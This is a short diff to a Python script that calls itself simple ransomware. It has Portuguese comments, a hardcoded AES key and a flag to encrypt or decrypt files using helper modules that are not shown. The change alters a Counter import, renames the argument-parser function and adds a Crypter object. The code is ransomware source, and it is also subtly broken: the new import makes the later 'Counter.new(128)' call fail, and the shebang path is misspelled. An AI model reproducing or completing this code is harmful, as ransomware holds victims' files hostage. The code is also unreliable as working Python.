@@ -1,7 +1,7 @@
 #!/urs/bin/python3
 # -*- coding: utf-8 -*-
 from Crypto.Cipher import AES
-from Crypto.Util import Counter
+from Crypto.Util.Counter import new as Counter
 import argparse
 import os
 import Discovery
@@ -10,7 +10,7 @@ import Crypter
 # A SENHA PODE TER OS SEGUINTES TAMANHOS: 128, 192 OU 256 BITS
 HARDCODED_KEY = '0123456789abcdef'  # Chave de 16 bytes (128 bits)
 
-def arg_parser():
+def get_parser():
     parser = argparse.ArgumentParser(description='Ransomware Simples')
     parser.add_argument('-d', '--decrypt', help='Decripta os arquivos', action='store_true')
     return parser
@@ -32,6 +32,7 @@ def main():
     ctr = Counter.new(128)
     key = key.encode()
 
+    crypt = Crypter.Crypter(key, ctr)
     if not decrypt:
         cryptoFn = crypt.encrypt
     else:
